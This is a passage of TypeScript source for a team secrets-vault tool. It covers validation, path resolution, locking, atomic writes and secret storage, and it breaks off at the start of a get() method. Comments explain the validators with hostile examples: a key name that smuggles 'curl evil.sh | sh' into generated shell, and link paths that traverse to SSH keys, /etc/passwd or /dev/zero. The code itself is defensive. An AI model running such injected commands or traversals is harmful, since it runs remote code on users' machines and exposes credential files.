/**
 * The vault file. Safe to commit — it contains only ciphertext and public keys.
 *
 * A vault can live in the repo (`.hush/vault.json`, committed) or outside it
 * (`~/.hush/vaults/<name>/vault.json`) with the repo holding a `.hush/link.json`
 * pointer. The second form is how one team vault serves many repos.
 */
import {
  existsSync, mkdirSync, readFileSync, writeFileSync, appendFileSync,
  openSync, writeSync, fsyncSync, closeSync, renameSync, unlinkSync, statSync,
} from "node:fs";
import { dirname, join, resolve, isAbsolute } from "node:path";
import { randomUUID, createHash } from "node:crypto";
import {
  SCHEME,
  newDek,
  wrapDek,
  unwrapDek,
  sealValue,
  openValue,
  decodePub,
  encodePub,
  fingerprint,
  ValidationError,
  isValidationError,
  type Opener,
  type Sealed,
  type Wrap,
} from "./crypto.ts";
import { isAgeRecipient, ageFingerprint, wrapDekWithAge, unwrapDekWithAge } from "./age.ts";
import { hushHome } from "./identity.ts";
import { isAccountScope, parseScope, scopeOf } from "./services.ts";

export interface Recipient {
  name: string;
  pk: string;
  role: "admin" | "member";
  addedAt: string;
  /** Absent means "x25519", so older vaults load unchanged. */
  type?: "x25519" | "age";
}

/** A data key wrapped either natively or by age (possibly via a hardware plugin). */
export type DekWrap = Wrap | { age: string };

export const isAgeWrap = (w: DekWrap): w is { age: string } => "age" in w;

export interface SecretEntry extends Sealed {
  /**
   * Which data-key generation sealed this value. Read by `staleValues()`, and
   * through it by `hush verify`: after a rotation every value must carry the
   * new generation, so one left behind means the re-seal did not finish — the
   * value is still readable only by whoever could read the old key.
   */
  gen: number;
  updatedAt: string;
  updatedBy: string;
  note?: string;
}

/**
 * What an environment is *for*, in the owner's words.
 *
 * Plaintext, beside the ciphertext rather than inside it: none of it is secret,
 * and keeping it out of the sealed payload means renaming or re-describing a set
 * never needs the data key — which for a hardware-backed identity is the
 * difference between editing a label and being asked to touch your YubiKey.
 *
 * Every field is optional. A set with no description is a set with no
 * description, not an error.
 */
export interface EnvMeta {
  /** The human spelling. The map key is the slug of it. */
  label?: string;
  description?: string;
  /** "Deploys only", "local dev", "the client's staging box". */
  whenToUse?: string;
  createdAt?: string;
  /** Where it came from, when it was imported from a file. */
  source?: string;
}

export interface VaultFile {
  scheme: string;
  id: string;
  name: string;
  createdAt: string;
  dek: { generation: number; wraps: Record<string, DekWrap> };
  recipients: Record<string, Recipient>;
  envs: Record<string, Record<string, SecretEntry>>;
  /** Optional, and absent in vaults written before environments had names. */
  meta?: Record<string, EnvMeta>;
}

/**
 * A POSIX environment variable name.
 *
 * This is a security boundary, not tidiness. Key names end up in generated
 * shell (`export ${k}=…`, which `hush hook` feeds to `eval`) and in .env
 * files. A member who can write to the vault could otherwise name a key
 * `FOO; curl evil.sh | sh; X` and run commands on every teammate's machine.
 */
const KEY_NAME = /^[A-Za-z_][A-Za-z0-9_]*$/;

/**
 * One segment of a scope name. The `(?!\.+$)` rules out ".", ".." and "....".
 *
 * Scopes are only object keys today, so a dot segment is harmless — but it costs
 * nothing to refuse now, and it stops a future change that derives a filename
 * from a scope from quietly becoming a path-traversal bug.
 */
const SCOPE_SEGMENT = /^(?!\.+$)[A-Za-z0-9_.-]+$/;

/**
 * Turn what someone typed into a name the rest of hush can carry.
 *
 * The slug is the real name — `hush run --env acme-production` — so it has to
 * satisfy SCOPE_SEGMENT, and it has to be stable enough that typing the same
 * label twice gives the same answer. The pretty spelling is kept alongside it.
 */
export function slugifyEnv(label: string): string {
  const slug = label
    .normalize("NFKD")
    .replace(/[\u0300-\u036f]/g, "")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 48);
  // "..." and "" are both refused by assertScopeName, and neither makes a
  // useful name, so fall back rather than hand back something that will throw.
  return /^[a-z0-9]/.test(slug) ? slug : "env-" + createHash("sha256").update(label).digest("hex").slice(0, 8);
}

export function assertKeyName(key: string): void {
  if (!KEY_NAME.test(key)) {
    throw new ValidationError(
      `"${key.slice(0, 40)}" is not a valid variable name. ` +
        `Use letters, digits and underscores, starting with a letter or underscore.`,
    );
  }
}

export function assertScopeName(scope: string): void {
  const segments = scope.split("/");
  const valid =
    segments.length >= 1 &&
    segments.length <= 2 &&
    segments.every((s) => SCOPE_SEGMENT.test(s));
  if (!valid) {
    throw new ValidationError(
      `"${scope.slice(0, 40)}" is not a valid environment or account name. ` +
        `Use letters, digits, dot, dash and underscore, optionally as service/account.`,
    );
  }
}

export { ValidationError, isValidationError };

export const isValidKeyName = (k: string): boolean => KEY_NAME.test(k);

/**
 * A generous ceiling on one value. The largest real secret is a private key at
 * a few kilobytes; anything approaching this is a mistake — a whole file pasted
 * into the wrong field — and silently accepting it bloats a vault everyone on
 * the team has to clone.
 */
const MAX_VALUE_BYTES = 1024 * 1024;

/** Far past any real rotation history; see assertVaultShape. */
const MAX_GENERATION = 1_000_000;

/** A tag is a label, not a document. */
const MAX_NOTE_CHARS = 200;

export const trimNote = (note?: string): string | undefined => {
  const t = (note ?? "").trim();
  return t ? t.slice(0, MAX_NOTE_CHARS) : undefined;
};

/**
 * Render a string that came out of the vault file.
 *
 * Everything hush *writes* is validated, but the file arrives over git — from
 * a teammate, or from whoever opened the pull request — and a hand-edited or
 * badly merged one can carry anything at all. Two things go wrong when such a
 * string is printed straight to a terminal:
 *
 *   - Length. A five-megabyte note rendered by `hush ls` took the process out
 *     with a kill signal: a denial of service anyone who can propose a change
 *     could cause.
 *   - Control characters. An ANSI escape sequence in a note or a member name is
 *     interpreted by the terminal rather than shown by it, so it can erase the
 *     lines above and rewrite what the reviewer thinks they are looking at.
 *
 * Notes, member names, environment names and the vault's own name all go
 * through here before they are displayed.
 */
export function safeText(s: unknown, max = MAX_NOTE_CHARS): string | undefined {
  if (typeof s !== "string") return undefined;
  // Strip C0, DEL and C1 — the whole escape-sequence alphabet — but keep every
  // printable character, because a name is allowed to be in someone's language.
  const clean = s.replace(/[\u0000-\u001f\u007f-\u009f]/gu, " ").trim();
  if (!clean) return undefined;
  return clean.length > max ? clean.slice(0, max) + "\u2026" : clean;
}

export function assertValueSize(key: string, value: string): void {
  const bytes = Buffer.byteLength(value, "utf8");
  if (bytes > MAX_VALUE_BYTES) {
    throw new ValidationError(
      `"${key}" is ${Math.round(bytes / 1024)} KB, over the ${MAX_VALUE_BYTES / 1024} KB limit for one secret. ` +
        `If this is a file rather than a credential, keep it out of the vault.`,
    );
  }
}

export interface LinkFile {
  vault: string;
  env?: string;
}

/** .hush/use.json — which account this repo uses for each service. Committable. */
export type UseFile = Record<string, string>;

export function loadUse(hushDir: string): UseFile {
  const p = join(hushDir, "use.json");
  if (!existsSync(p)) return {};
  try {
    return JSON.parse(readFileSync(p, "utf8")) as UseFile;
  } catch {
    return {};
  }
}

export function saveUse(hushDir: string, use: UseFile): void {
  mkdirSync(hushDir, { recursive: true });
  writeFileSync(join(hushDir, "use.json"), JSON.stringify(use, null, 2) + "\n");
}

// ------------------------------------------------------------------ locating

/** Walk up from `start` looking for a `.hush` directory. */
export function findHushDir(start = process.cwd()): string | null {
  let dir = resolve(start);
  for (;;) {
    const candidate = join(dir, ".hush");
    if (existsSync(join(candidate, "vault.json")) || existsSync(join(candidate, "link.json"))) {
      return candidate;
    }
    const parent = dirname(dir);
    if (parent === dir) return null;
    dir = parent;
  }
}

export const namedVaultPath = (name: string): string =>
  join(hushHome(), "vaults", name, "vault.json");

/** Resolve the vault file a given directory is governed by. */
/**
 * A vault name, as it may appear in a committed `link.json`.
 *
 * One path segment, no traversal. The name is joined onto ~/.hush/vaults, so
 * "../../.ssh/id_ed25519" reaches outside it — and link.json is documented as
 * safe to commit, which means it arrives from whoever wrote the repository.
 */
const LINK_NAME = /^(?!\.+$)[A-Za-z0-9_.-]+$/;

/**
 * Strip the excerpt V8 puts in a JSON parse error.
 *
 * `Unexpected token 'r', "root:x:0:0:daemon" is not valid JSON` quotes the file
 * it failed on. For a vault that is your own file and harmless; for a path named
 * by someone else's link.json it is an arbitrary-file read whose first bytes get
 * printed. The position is the useful half and it survives.
 */
const jsonErrorSummary = (e: unknown): string =>
  String((e as Error)?.message ?? e)
    .replace(/"[\s\S]*?"\.{0,3}/g, "…")
    .slice(0, 120);

/**
 * The vault a link points at must be a regular file.
 *
 * Not a directory, and above all not a device or a fifo: `{"vault":"/dev/zero"}`
 * in a cloned repo would otherwise make every hush command read for ever.
 */
function assertReadableVaultFile(path: string, why: string): void {
  let stat;
  try {
    stat = statSync(path);
  } catch {
    throw new Error(`No vault at ${path}.\n  ${why}`);
  }
  if (!stat.isFile()) {
    throw new Error(`${path} is not a vault file.\n  ${why}`);
  }
}

export function resolveVaultPath(start = process.cwd()): { vaultPath: string; hushDir: string; env?: string } | null {
  if (process.env.HUSH_VAULT) {
    const p = resolve(process.env.HUSH_VAULT);
    return { vaultPath: p, hushDir: dirname(p), env: process.env.HUSH_ENV };
  }
  const hushDir = findHushDir(start);
  if (!hushDir) return null;

  const linkPath = join(hushDir, "link.json");
  if (existsSync(linkPath)) {
    let link: LinkFile;
    try {
      link = JSON.parse(readFileSync(linkPath, "utf8")) as LinkFile;
    } catch (e) {
      throw new Error(
        `${linkPath} is not valid JSON (${jsonErrorSummary(e)}).\n` +
          `  It should look like:  { "vault": "personal", "env": "default" }`,
      );
    }
    // Without this check a missing field surfaced as an internal path error.
    if (typeof link?.vault !== "string" || link.vault.trim() === "") {
      throw new Error(
        `${linkPath} does not name a vault.\n` +
          `  It should look like:  { "vault": "personal", "env": "default" }\n` +
          `  Or re-create it with:  hush link <vault-name>`,
      );
    }

    const named = link.vault.trim();
    let target: string;
    if (isAbsolute(named)) {
      target = named;
      // An absolute path in a committed link.json is not portable anyway — it
      // cannot exist on a teammate's machine — so it is either yours or it is
      // someone else's idea of where you should look. Never silent.
      if (!resolve(target).startsWith(resolve(hushHome()) + "/")) {
        process.stderr.write(
          `hush: ${linkPath} points outside ~/.hush — reading ${target}\n`,
        );
      }
    } else {
      if (!LINK_NAME.test(named)) {
        throw new Error(
          `${linkPath} names "${named.slice(0, 40)}", which is not a vault name.\n` +
            `  A name is one segment: letters, digits, dot, dash, underscore.\n` +
            `  If this file came from a repository you cloned, do not trust it.`,
        );
      }
      target = namedVaultPath(named);
    }
    assertReadableVaultFile(target, `Named by ${linkPath}. Re-create it with: hush link <vault-name>`);
    return { vaultPath: target, hushDir, env: process.env.HUSH_ENV || link.env };
  }
  return { vaultPath: join(hushDir, "vault.json"), hushDir, env: process.env.HUSH_ENV };
}

/**
 * Every identity slot this opener could match.
 *
 * `includeAge` exists because reading an age identity can mean talking to a
 * YubiKey. Resolving it when the vault has no age recipients at all would make
 * the hardware prompt on `hush ls`, for nothing.
 */
function candidatesOf(
  id: Opener,
  includeAge = true,
): { fp: string; kind: "x25519" | "age"; recipient?: string }[] {
  const out: { fp: string; kind: "x25519" | "age"; recipient?: string }[] = [];
  if (id.pub) out.push({ fp: fingerprint(id.pub), kind: "x25519" });
  if (includeAge) {
    for (const r of id.age?.recipients ?? []) {
      out.push({ fp: ageFingerprint(r), kind: "age", recipient: r });
    }
  }
  return out;
}

/** How to name this opener in an error message. */
function describeOpener(id: Opener): string {
  if (id.pub) return encodePub(id.pub);
  const first = id.age?.recipients[0];
  return first ?? "(no identity)";
}

// --------------------------------------------------------------------- lock

const sleepSync = (ms: number): void => {
  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
};

const hashOf = (s: string | Buffer): string =>
  createHash("sha256").update(s).digest("hex");

/**
 * Hold an exclusive lock for the duration of a read-modify-write.
 *
 * Without this, two `hush set` commands each read the vault, each add their own
 * key, and the second write silently discards the first. Running eight at once
 * left one survivor.
 */
/** A lock untouched for this long is assumed to belong to a dead process. */
const STALE_LOCK_MS = 30_000;

/** Tunable for CI and for tests that need to observe the wait, not sit through it. */
const lockTimeoutMs = (): number => Number(process.env.HUSH_LOCK_TIMEOUT_MS) || 15_000;

function withVaultLock<T>(vaultPath: string, fn: () => T, timeoutMs = lockTimeoutMs()): T {
  const lockPath = `${vaultPath}.lock`;
  const deadline = Date.now() + timeoutMs;
  let fd: number | undefined;

  for (;;) {
    try {
      fd = openSync(lockPath, "wx");
      break;
    } catch (e) {
      if ((e as NodeJS.ErrnoException).code !== "EEXIST") throw e;

      // A process that died mid-write would otherwise wedge the vault forever,
      // so a lock that has not been touched for a while is reclaimable.
      //
      // Staleness is judged by mtime, never by the file's contents. open(…,"wx")
      // creates the file EMPTY and fills it a moment later; a reader landing in
      // that window sees "", fails to parse it, and — on the old "unreadable
      // means stale" rule — deleted a lock that was very much alive. Two writers
      // then held it at once and one's write was silently lost, while still
      // reporting success.
      let age: number;
      try {
        age = Date.now() - statSync(lockPath).mtimeMs;
      } catch {
        continue; // the lock vanished; race for it again
      }
      if (age > STALE_LOCK_MS) {
        try {
          // Only reclaim if nobody refreshed it since we looked.
          if (Date.now() - statSync(lockPath).mtimeMs > STALE_LOCK_MS) unlinkSync(lockPath);
        } catch { /* someone else got there first */ }
        continue;
      }
      if (Date.now() > deadline) {
        throw new Error(
          `Timed out waiting for the vault lock (${lockPath}). If no other hush is running, delete it.`,
        );
      }
      sleepSync(40);
    }
  }

  try {
    writeSync(fd, JSON.stringify({ pid: process.pid, at: Date.now() }));
    closeSync(fd);
    fd = undefined;
    return fn();
  } finally {
    if (fd !== undefined) {
      try { closeSync(fd); } catch { /* already closed */ }
    }
    try { unlinkSync(lockPath); } catch { /* best effort */ }
  }
}

// -------------------------------------------------------------------- vault

/**
 * Check the shape of a vault file before anything trusts it.
 *
 * `open()` used to verify only the scheme string, so every other field was taken
 * on faith from a file that arrives over git. That mattered most for the numbers:
 * a vault with `"generation": "lots"` decrypted perfectly while silently
 * disabling rollback detection, because `"lots" < 4` is false and so is
 * `"lots" > 4` — the comparison that is supposed to shout simply stopped
 * shouting. Same for a negative generation, and for a `gen` that is not a number.
 *
 * This is deliberately a shape check, not a schema: unknown extra fields are
 * fine, so a vault written by a newer hush still loads here.
 */
function assertVaultShape(data: VaultFile, path: string): void {
  const bad = (why: string): never => {
    throw new Error(
      `The vault at ${path} is malformed: ${why}.\n` +
        `  A vault is not merged line by line — restore one whole side: git checkout --theirs ${path}`,
    );
  };
  const isObject = (x: unknown): x is Record<string, unknown> =>
    typeof x === "object" && x !== null && !Array.isArray(x);
  // Bounded above as well as below. A vault claiming generation 2^53 decrypts
  // perfectly and poisons the rollback watermark for good: every genuine vault
  // afterwards reads as "rolled back", so the warning that is supposed to mean
  // something fires constantly and `hush verify` never passes again. A million
  // rotations is far beyond anything real — a daily rotation for 2700 years.
  const isGeneration = (x: unknown): x is number =>
    typeof x === "number" && Number.isSafeInteger(x) && x >= 1 && x <= MAX_GENERATION;

  if (!isObject(data.dek)) bad("it has no data key");
  if (!isGeneration(data.dek.generation)) {
    bad(`the key generation is ${JSON.stringify(data.dek.generation)} rather than a positive whole number`);
  }
  if (!isObject(data.dek.wraps)) bad("the data key has no wraps");
  if (!isObject(data.recipients)) bad("the member list is not an object");
  if (!isObject(data.envs)) bad("the environments are not an object");

  for (const [fp, r] of Object.entries(data.recipients)) {
    if (!isObject(r) || typeof r.pk !== "string" || typeof r.name !== "string") {
      bad(`member "${fp.slice(0, 12)}" is missing a name or a public key`);
    }
    // Checked on load rather than at the next rotation. Without this, a vault
    // carrying `"pk": "../../../etc/passwd"` opens and lists fine, and only
    // falls over later inside `hush team rm` — in the middle of a revocation,
    // which is the worst moment to discover the file was malformed all along.
    const pk = r.pk as string;
    if (!isAgeRecipient(pk)) {
      try {
        decodePub(pk);
      } catch {
        bad(`member "${(r.name as string).slice(0, 24)}" has a public key that is neither a hush key nor an age recipient`);
      }
    }
  }
  if (data.meta !== undefined) {
    if (!isObject(data.meta)) bad("the environment descriptions are not an object");
    for (const [env, m] of Object.entries(data.meta)) {
      if (!isObject(m)) bad(`the description of "${env.slice(0, 40)}" is not an object`);
    }
  }
  for (const [env, values] of Object.entries(data.envs)) {
    if (!isObject(values)) bad(`environment "${env.slice(0, 40)}" is not an object`);
    for (const [key, e] of Object.entries(values)) {
      if (!isObject(e) || typeof e.iv !== "string" || typeof e.ct !== "string" || typeof e.tag !== "string") {
        bad(`"${env.slice(0, 20)}/${key.slice(0, 40)}" is not a sealed value`);
      }
      // A non-numeric generation here would defeat the re-seal check the same
      // way a non-numeric one on the data key defeats rollback detection.
      if (!isGeneration((e as unknown as SecretEntry).gen)) {
        bad(`"${env.slice(0, 20)}/${key.slice(0, 40)}" records generation ${JSON.stringify((e as unknown as SecretEntry).gen)}`);
      }
    }
  }
}

export class Vault {
  readonly path: string;
  data: VaultFile;
  /**
   * Keyed by recipient fingerprint. Never a bare Buffer: an unkeyed cache would
   * hand the DEK to whichever identity asked second, which is exactly the bug
   * that makes revocation meaningless inside a long-lived process.
   */
  private dekCache: { fp: string; dek: Buffer } | null = null;

  /** Hash of the bytes this instance was read from, to detect a concurrent write. */
  private baseline: string | null = null;
  /** Value-level edits, replayable onto a newer copy if someone else wrote first. */
  private journal: (
    | { op: "set"; env: string; key: string; value: string; note?: string }
    | { op: "delete"; env: string; key: string }
    | { op: "retag"; env: string; key: string; note?: string }
    | { op: "describe"; env: string; meta: EnvMeta }
  )[] = [];
  /** Set by membership or key-rotation changes, which are not safely replayable. */
  private structural = false;
  /** Remembered so a replay can re-seal under the newer data key. */
  private opener: Opener | null = null;

  /** True when at least one member uses age, so hardware is worth waking. */
  private get usesAge(): boolean {
    return Object.values(this.data.dek.wraps).some(isAgeWrap);
  }

  private myCandidates(id: Opener) {
    return candidatesOf(id, this.usesAge);
  }

  private constructor(path: string, data: VaultFile) {
    this.path = path;
    this.data = data;
  }

  /** The founding member is either an X25519 key or an age recipient. */
  static create(
    path: string,
    name: string,
    owner: { name: string; pub?: Buffer; ageRecipient?: string },
  ): Vault {
    const dek = newDek();
    const now = new Date().toISOString();

    let fp: string;
    let wrap: DekWrap;
    let recipient: Recipient;

    if (owner.ageRecipient) {
      const r = owner.ageRecipient.trim();
      fp = ageFingerprint(r);
      wrap = { age: wrapDekWithAge(dek, r) };
      recipient = { name: owner.name, pk: r, role: "admin", addedAt: now, type: "age" };
    } else if (owner.pub) {
      fp = fingerprint(owner.pub);
      wrap = wrapDek(dek, owner.pub);
      recipient = { name: owner.name, pk: encodePub(owner.pub), role: "admin", addedAt: now, type: "x25519" };
    } else {
      throw new Error("A vault needs a founding member: pass either pub or ageRecipient.");
    }

    const data: VaultFile = {
      scheme: SCHEME,
      id: `vlt_${randomUUID().replace(/-/g, "").slice(0, 16)}`,
      name,
      createdAt: now,
      dek: { generation: 1, wraps: { [fp]: wrap } },
      recipients: { [fp]: recipient },
      envs: { default: {} },
    };
    const v = new Vault(path, data);
    v.dekCache = { fp, dek };
    v.save();
    return v;
  }

  static open(path: string): Vault {
    if (!existsSync(path)) throw new Error(`No vault at ${path}. Run \`hush init\`.`);
    const raw = readFileSync(path, "utf8");

    let data: VaultFile;
    try {
      data = JSON.parse(raw) as VaultFile;
    } catch (e) {
      // By far the likeliest cause: two people added secrets, git conflicted,
      // and the markers were committed. "Unexpected token '<'" helps nobody.
      const conflicted = /^<{7} |^={7}$|^>{7} /m.test(raw);
      throw new Error(
        conflicted
          ? `The vault at ${path} still contains git conflict markers.\n` +
            `  Resolve it by taking ONE side whole — a vault cannot be merged line by line.\n` +
            `  Whoever's changes you drop can re-add them with \`hush set\`.`
          : `The vault at ${path} is not valid JSON (${jsonErrorSummary(e)}).\n` +
            `  Restore it from git history: git checkout HEAD -- ${path}`,
      );
    }

    if (data?.scheme !== SCHEME) {
      throw new Error(
        `Unsupported vault scheme ${data?.scheme ?? "(none)"} (this build speaks ${SCHEME}).\n` +
          `  Upgrade hush, or check that ${path} really is a vault file.`,
      );
    }
    assertVaultShape(data, path);
    const v = new Vault(path, data);
    v.baseline = hashOf(raw);
    return v;
  }

  /**
   * Write atomically: full contents to a temp file, fsync, then rename.
   *
   * A plain writeFileSync truncates first, so a crash, a full disk, or two
   * concurrent commands mid-write leaves a truncated vault — which means every
   * secret in it is gone. rename(2) on the same filesystem is atomic, so a
   * reader sees either the old file or the new one, never a half-written one.
   */
  save(): void {
    mkdirSync(dirname(this.path), { recursive: true });
    withVaultLock(this.path, () => this.saveLocked());
  }

  /**
   * Reconcile with whatever is on disk, then write.
   *
   * If another process wrote while we were thinking, our in-memory copy is
   * stale and writing it would erase their work. Value edits are replayed onto
   * the newer copy so both survive; membership and rotation changes are not
   * replayable, so those refuse rather than guess.
   */
  private saveLocked(): void {
    const onDisk = existsSync(this.path) ? readFileSync(this.path, "utf8") : null;

    if (this.baseline !== null && onDisk !== null && hashOf(onDisk) !== this.baseline) {
      // Deletions replay without an identity; only re-sealing a value needs one.
      const needsOpener = this.journal.some((e) => e.op === "set");
      if (this.structural || this.journal.length === 0 || (needsOpener && !this.opener)) {
        throw new Error(
          "The vault changed on disk while this command was running, and this change " +
            "cannot be merged automatically. Re-run the command.",
        );
      }
      // Validated, not just parsed. This is the one path that adopts a vault
      // file without going through open(), and it adopts it wholesale — so a
      // malformed file landing here would replace our in-memory copy and then
      // be written straight back out, laundering it into the repo.
      const parsed = JSON.parse(onDisk) as VaultFile;
      assertVaultShape(parsed, this.path);
      const fresh = new Vault(this.path, parsed);
      for (const entry of this.journal) {
        if (entry.op === "set") fresh.set(this.opener!, entry.env, entry.key, entry.value, entry.note);
        else if (entry.op === "retag") fresh.retag(entry.env, entry.key, entry.note);
        else if (entry.op === "describe") {
          // Metadata replays without a key, like a retag: it is plaintext beside
          // the ciphertext, not inside it.
          if (fresh.data.envs[entry.env]) fresh.describeEnv(entry.env, entry.meta);
        } else fresh.delete(entry.env, entry.key);
      }
      this.data = fresh.data;
      this.dekCache = null;
    }

    this.writeAtomically();
    this.journal = [];
    this.structural = false;
  }

  private writeAtomically(): void {
    const body = JSON.stringify(this.data, null, 2) + "\n";
    const tmp = `${this.path}.${process.pid}.tmp`;

    let fd: number | undefined;
    try {
      fd = openSync(tmp, "w", 0o600);
      writeSync(fd, body);
      fsyncSync(fd);
      closeSync(fd);
      fd = undefined;
      renameSync(tmp, this.path);
      this.baseline = hashOf(body);
    } catch (e) {
      if (fd !== undefined) {
        try { closeSync(fd); } catch { /* already closed */ }
      }
      if (existsSync(tmp)) {
        try { unlinkSync(tmp); } catch { /* best effort */ }
      }
      throw e;
    }
  }

  // ------------------------------------------------------------ key access

  /**
   * Unwrap the DEK with the caller's identity. Throws if they were revoked.
   * Membership is re-checked on every call, before the cache is consulted.
   */
  dek(id: Opener): Buffer {
    for (const c of this.myCandidates(id)) {
      const wrap = this.data.dek.wraps[c.fp];
      if (!wrap) continue;
      if (this.dekCache?.fp === c.fp) return this.dekCache.dek;

      // An age wrap may be backed by a YubiKey or the Secure Enclave, so this
      // line is where the human gets prompted to touch something.
      const dek = isAgeWrap(wrap)
        ? unwrapDekWithAge(wrap.age, id.age!.identityPath)
        : unwrapDek(wrap, { pub: id.pub!, priv: id.priv! });

      this.dekCache = { fp: c.fp, dek };
      return dek;
    }
    throw new Error(
      `Your key is not a recipient of vault "${this.data.name}".\n` +
        `Ask an admin to run:  hush team add <you> ${describeOpener(id)}`,
    );
  }

  canRead(id: Opener): boolean {
    return this.myCandidates(id).some((c) => Boolean(this.data.dek.wraps[c.fp]));
  }

  meFingerprint(id: Opener): string {
    const hit = this.myCandidates(id).find((c) => this.data.dek.wraps[c.fp]);
    return hit?.fp ?? "";
  }

  memberName(id: Opener): string {
    for (const c of this.myCandidates(id)) {
      const r = this.data.recipients[c.fp];
      if (r) return safeText(r.name, 64) ?? "unknown";
    }
    return "unknown";
  }

  // -------------------------------------------------------------- secrets

  envNames(): string[] {
    return Object.keys(this.data.envs).sort();
  }

  /** Environments that are not service accounts: "default", "prod", … */
  plainEnvs(): string[] {
    return this.envNames().filter((e) => !isAccountScope(e));
  }

  /** Every (service, account) pair holding at least one secret. */
  accounts(): { service: string; account: string; scope: string; vars: string[] }[] {
    const out: { service: string; account: string; scope: string; vars: string[] }[] = [];
    for (const scope of this.envNames()) {
      const parsed = parseScope(scope);
      if (!parsed) continue;
      out.push({ ...parsed, scope, vars: Object.keys(this.data.envs[scope] ?? {}).sort() });
    }
    return out.sort((a, b) =>
      a.service === b.service ? a.account.localeCompare(b.account) : a.service.localeCompare(b.service),
    );
  }

  /** Which accounts exist for one service, e.g. fal -> ["acme", "personal", "client"]. */
  accountsFor(service: string): string[] {
    return this.accounts()
      .filter((a) => a.service === service.toLowerCase())
      .map((a) => a.account);
  }

  /**
   * Build the environment for a run: the base env, then each chosen service
   * account layered on top. Later layers win, so `--with` beats a pinned default.
   */
  resolve(
    id: Opener,
    baseEnv: string,
    choices: { service: string; account: string }[],
  ): { secrets: Record<string, string>; layers: string[] } {
    const secrets: Record<string, string> = {};
    const layers: string[] = [];

    if (this.data.envs[baseEnv]) {
      Object.assign(secrets, this.materialize(id, baseEnv));
      layers.push(baseEnv);
    }
    for (const { service, account } of choices) {
      const scope = scopeOf(service, account);
      if (!this.data.envs[scope]) {
        const known = this.accountsFor(service);
        throw new ValidationError(
          `No account "${account}" for service "${service}".` +
            (known.length ? ` Known: ${known.join(", ")}` : ` Add one with: hush add ${service} --account ${account}`),
        );
      }
      Object.assign(secrets, this.materialize(id, scope));
      layers.push(scope);
    }
    return { secrets, layers };
  }

  ensureEnv(env: string): Record<string, SecretEntry> {
    this.data.envs[env] ??= {};
    return this.data.envs[env];
  }

  /** Key names only. Safe to show an agent. */
  list(env: string): { key: string; updatedAt: string; updatedBy: string; note?: string }[] {
    const slot = this.data.envs[env] ?? {};
    return Object.entries(slot)
      // Sanitised here rather than at each call site: every renderer reads this,
      // and one that forgot would be a terminal-escape hole, not a cosmetic slip.
      .map(([key, e]) => ({
        key,
        updatedAt: safeText(e.updatedAt, 32) ?? "",
        updatedBy: safeText(e.updatedBy, 64) ?? "unknown",
        note: safeText(e.note),
      }))
      .sort((a, b) => a.key.localeCompare(b.key));
  }

  /**
   * Create an environment with nothing in it yet.
   *
   * A named set with no keys is a perfectly reasonable thing to make first and
   * fill in afterwards, and `ensureEnv` is private because callers should not
   * be reaching into the value map.
   */
  /**
   * Declare that this change cannot be replayed onto a newer copy.
   *
   * Value edits merge; anything that adds, removes or renames an environment
   * does not, because there is no sensible way to blend two of those. Callers
   * that reach into `data.envs` directly have to say so themselves.
   */
  markStructural(): void {
    this.structural = true;
  }

  ensureEnvExists(env: string): void {
    assertScopeName(env);
    this.ensureEnv(env);
  }

  /** What this environment is called and what it is for. Never throws. */
  envMeta(env: string): EnvMeta {
    return this.data.meta?.[env] ?? {};
  }

  /** The display name: what they typed, falling back to the name itself. */
  envLabel(env: string): string {
    return safeText(this.data.meta?.[env]?.label, 80) ?? env;
  }

  /**
   * Every environment as a named set, which is how a person thinks about them:
   * a thing with a name, a purpose, and some keys in it.
   */
  envSets(): {
    name: string;
    label: string;
    description?: string;
    whenToUse?: string;
    source?: string;
    isAccount: boolean;
    keys: string[];
  }[] {
    return this.envNames()
      .map((name) => {
        const meta = this.envMeta(name);
        return {
          name,
          label: this.envLabel(name),
          description: safeText(meta.description, 500),
          whenToUse: safeText(meta.whenToUse, 500),
          source: safeText(meta.source, 200),
          isAccount: isAccountScope(name),
          keys: Object.keys(this.data.envs[name] ?? {}).sort(),
        };
      })
      .sort((a, b) => a.label.localeCompare(b.label));
  }

  /**
   * Describe an environment. Metadata only — no data key needed, so this never
   * prompts a hardware identity.
   */
  describeEnv(env: string, meta: Partial<EnvMeta>): void {
    assertScopeName(env);
    if (!this.data.envs[env]) throw new ValidationError(`No environment "${env}".`);
    this.data.meta ??= {};
    const current = this.data.meta[env] ?? {};
    const next: EnvMeta = { ...current };
    for (const field of ["label", "description", "whenToUse", "source"] as const) {
      if (!(field in meta)) continue;
      const value = safeText(meta[field], field === "label" ? 80 : 500);
      if (value) next[field] = value;
      else delete next[field];
    }
    next.createdAt ??= new Date().toISOString();
    this.data.meta[env] = next;
    this.journal.push({ op: "describe", env, meta: next });
  }

  has(env: string, key: string): boolean {
    return Boolean(this.data.envs[env]?.[key]);
  }

  /**
   * Data-key wraps with no member entry behind them.
   *
   * The wraps map is what actually grants decryption; `recipients` is the list
   * people read. A wrap whose fingerprint is absent from `recipients` therefore
   * opens every secret in the vault while `hush team ls` shows no such member —
   * which is exactly the shape a revoked member would add if they still held the
   * data key and wanted quiet access. hush never writes one.
   */
  unlistedWraps(): string[] {
    return Object.keys(this.data.dek.wraps)
      .filter((fp) => !this.data.recipients[fp])
      .sort();
  }

  /**
   * Values sealed under a data key older than the vault's current one.
   *
   * `rotate()` and `removeRecipient()` re-seal everything, so in a vault hush
   * wrote this is always empty. It will not be empty if a rotation was
   * interrupted, or if two branches were merged by hand and one side's values
   * were kept next to the other side's key — in which case a revoked member's
   * old key still opens the values that were left behind, and the revocation
   * only looks complete.
   */
  staleValues(): { env: string; key: string; gen: number }[] {
    const current = this.data.dek.generation;
    const out: { env: string; key: string; gen: number }[] = [];
    for (const [env, values] of Object.entries(this.data.envs)) {
      for (const [key, entry] of Object.entries(values)) {
        if (entry.gen < current) out.push({ env, key, gen: entry.gen });
      }
    }
    return out.sort((a, b) => a.env.localeCompare(b.env) || a.key.localeCompare(b.key));
  }

  set(id: Opener, env: string, key: string, value: string, note?: string): void {
    assertScopeName(env);
    assertKeyName(key);
    assertValueSize(key, value);
    this.opener = id;
    this.journal.push({ op: "set", env, key, value, ...(note ? { note } : {}) });
    const dek = this.dek(id);
    const slot = this.ensureEnv(env);
    slot[key] = {
      ...sealValue(dek, env, key, value),
      gen: this.data.dek.generation,
      updatedAt: new Date().toISOString(),
      updatedBy: this.memberName(id),
      ...(trimNote(note) ? { note: trimNote(note) } : {}),
    };
  }

  get(id: Opener, env: string, key: string): string {
